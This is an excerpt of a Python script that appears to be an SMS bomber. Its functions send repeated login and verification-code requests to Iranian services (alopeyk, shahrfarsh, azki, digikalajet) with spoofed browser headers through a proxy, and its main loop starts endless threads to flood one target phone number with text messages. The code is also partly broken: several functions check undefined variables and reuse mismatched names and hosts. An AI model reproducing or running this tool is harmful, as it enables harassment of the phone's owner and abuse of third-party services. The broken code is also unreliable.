...
def alopeyk(phone):
    #alopeyk api
    alopeykH = {"Host": "alopeyk.com","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://alopeyk.com","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://alopeyk.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    alopeykD = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        alopeyk = requests.post("https://api.alopeyk.com/api/v2/login?platform=pwa", headers=alopeykH, json=alopeykD, proxies=proxy)
        if "OK" in alopeyk.text:
            print ("sended sms:)")
        else:
            print ("Error!")
    except:
...
def shahrfarsh(phone):
    #shahrfarsh api
    shahrfarshH = {"Host": "shahrfarsh.com","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://shahrfarsh.com","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://shahrfarsh.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shahrfarshD = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        alopeyk = requests.post("https://shahrfarsh.com/Account/Login", headers=shahrfarshH, json=shahrfarshD, proxies=proxy)
        if "OK" in shahrfarsh.text:
            print ("sended sms:)")
        else:
            print ("Error!")
    except:
...
def azki(phone):
    #azki api
    azkiH = {"Host": "shahrfarsh.com","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://azki.com","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://azki.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    azkiD = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        alopeyk = requests.post("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", headers=azkiH, json=azkiD, proxies=proxy)
        if "OK" in azki.text:
            print ("sended sms:)")
        else:
            print ("Error!")
...
def digikalajet(phone):
    #digikalajet api
    digikalajetH = {"Host": "digikalajet.ir","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://digikalajet.ir","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://digikalajet.ir/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    digikalajetD = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        alopeyk = requests.post("https://api.digikalajet.ir/user/login-register//", headers=digikalajetH, json=digikalajetD, proxies=proxy)
        if "OK" in digikalajet.text:
            print ("sended sms:)")
        else:
            print ("Error!")
    except:
...
def main():
    ...
    while True:
        ...
        Thread(target=digikalajet, args=[phone]).start()
